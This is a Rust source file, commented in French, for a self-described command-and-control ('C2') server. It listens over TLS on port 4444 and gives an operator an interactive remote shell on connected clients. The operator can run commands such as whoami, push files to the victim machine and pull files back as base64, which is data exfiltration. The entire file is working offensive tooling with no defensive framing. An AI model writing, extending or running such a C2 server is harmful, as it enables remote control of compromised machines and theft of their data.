use std::fs::File;
use std::io::{self, Write, BufRead, BufReader, Read};
use std::net::TcpListener;
use native_tls::{Identity, TlsAcceptor};
use std::thread;
use std::sync::Arc;
use base64::{Engine as _, engine::general_purpose};

fn main() {
    println!("Démarrage du Serveur C2 en Rust (Mode Robuste & Base64)...");

    // ========================================================================
    // 1. CHARGEMENT DE L'IDENTITÉ (Gestion d'erreurs propre)
    // ========================================================================
    
    let mut file = match File::open("identity.pfx") {
        Ok(f) => f,
        Err(e) => {
            eprintln!("[-] ERREUR FATALE: Impossible d'ouvrir 'identity.pfx': {}", e);
            return;
        }
    };

    let mut identity_bytes = vec![];
    if let Err(e) = file.read_to_end(&mut identity_bytes) {
        eprintln!("[-] ERREUR FATALE: Lecture du fichier PFX échouée: {}", e);
        return;
    }
    
    let identity = match Identity::from_pkcs12(&identity_bytes, "password") {
        Ok(id) => id,
        Err(e) => {
            eprintln!("[-] ERREUR FATALE: Mauvais mot de passe ou fichier PFX corrompu: {}", e);
            return;
        }
    };

    let acceptor = match TlsAcceptor::new(identity) {
        Ok(acc) => Arc::new(acc),
        Err(e) => {
            eprintln!("[-] ERREUR FATALE: Création TlsAcceptor impossible: {}", e);
            return;
        }
    };

    // ========================================================================
    // 2. ÉCOUTE RÉSEAU
    // ========================================================================
    
    let listener = match TcpListener::bind("0.0.0.0:4444") {
        Ok(l) => l,
        Err(e) => {
            eprintln!("[-] ERREUR FATALE: Impossible d'écouter sur le port 4444: {}", e);
            return;
        }
    };

    println!("[*] En écoute sur le port 4444 (TLS)...");

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                let acceptor = acceptor.clone();
                
                thread::spawn(move || {
                    println!("[*] Connexion entrante...");
                    
                    match acceptor.accept(stream) {
                        Ok(stream) => {
                            println!("[+] Session TLS établie !");
                            let mut reader = BufReader::new(stream);
                            
                            loop {
                                print!("Shell> ");
                                let _ = io::stdout().flush();
                                
                                let mut command = String::new();
                                if let Err(e) = io::stdin().read_line(&mut command) {
                                    println!("[-] Erreur lecture clavier: {}", e);
                                    break;
                                }
                                let command = command.trim().to_string();

                                if command.is_empty() { continue; }
                                if command == "exit" { break; }

                                // --- LOGIQUE ENVOI (UPLOAD) ---
                                let mut final_command = command.clone();
                                let mut skip_sending = false;

                                if command.starts_with("upload") {
                                    let parts: Vec<&str> = command.split_whitespace().collect();
                                    if parts.len() >= 2 {
                                        let local_path = parts[1];
                                        let remote_name = if parts.len() > 2 { parts[2] } else { local_path };
                                        
                                        match std::fs::read(local_path) {
                                            Ok(content) => {
                                                let b64 = general_purpose::STANDARD.encode(&content);
                                                final_command = format!("upload {} {}", b64, remote_name);
                                                println!("[+] Upload: Envoi de {} octets encodés...", content.len());
                                            },
                                            Err(e) => { 
                                                println!("[-] Erreur fichier local: {}", e); 
                                                skip_sending = true; 
                                            }
                                        }
                                    } else {
                                        println!("[-] Usage: upload <local> [distant]");
                                        skip_sending = true;
                                    }
                                }

                                if skip_sending { continue; }

                                // Envoi au client
                                if let Err(e) = reader.get_mut().write_all(format!("{}\n", final_command).as_bytes()) {
                                    println!("[-] Erreur d'envoi (Client déconnecté ?): {}", e);
                                    break;
                                }

                                // --- RÉCEPTION RÉPONSE ---
                                let mut buffer = String::new();
                                match reader.read_line(&mut buffer) {
                                    Ok(n) => {
                                        if n == 0 { break; } // Fin connexion
                                        let received_b64 = buffer.trim();

                                        if command.starts_with("download") {
                                            // Décodage Base64
                                            match general_purpose::STANDARD.decode(received_b64) {
                                                Ok(bytes) => {
                                                    // Vérif erreur client
                                                    let preview = String::from_utf8_lossy(&bytes);
                                                    if preview.starts_with("ERROR:") {
                                                        println!("[-] {}", preview);
                                                    } else {
                                                        // Extraction nom de fichier propre
                                                        let parts: Vec<&str> = command.split_whitespace().collect();
                                                        if parts.len() >= 2 {
                                                            let raw_path = parts[1];
                                                            // On garde tout ce qui est après le dernier \ ou /
                                                            let filename = raw_path.split(|c| c == '\\' || c == '/').last().unwrap_or("downloaded_file.bin");

                                                            match File::create(filename) {
                                                                Ok(mut file) => {
                                                                    if let Err(e) = file.write_all(&bytes) {
                                                                        println!("[-] Erreur écriture disque: {}", e);
                                                                    } else {
                                                                        println!("[+] Fichier '{}' reçu ({} octets) !", filename, bytes.len());
                                                                    }
                                                                },
                                                                Err(e) => println!("[-] Erreur création fichier: {}", e),
                                                            }
                                                        }
                                                    }
                                                },
                                                Err(e) => println!("[-] Erreur décodage Base64 Download: {}", e),
                                            }
                                        } else {
                                            // Commande standard (dir, whoami...)
                                            match general_purpose::STANDARD.decode(received_b64) {
                                                Ok(bytes) => {
                                                    let response = String::from_utf8_lossy(&bytes);
                                                    println!("{}", response);
                                                },
                                                Err(_) => {
                                                    // Fallback si pas Base64
                                                    println!("{}", buffer);
                                                }
                                            }
                                        }
                                    },
                                    Err(e) => {
                                        println!("[-] Erreur lecture socket: {}", e);
                                        break;
                                    }
                                }
                            }
                        },
                        Err(e) => println!("[-] Handshake TLS échoué: {}", e),
                    }
                });
            }
            Err(e) => println!("[-] Erreur connexion TCP: {}", e),
        }
    }
}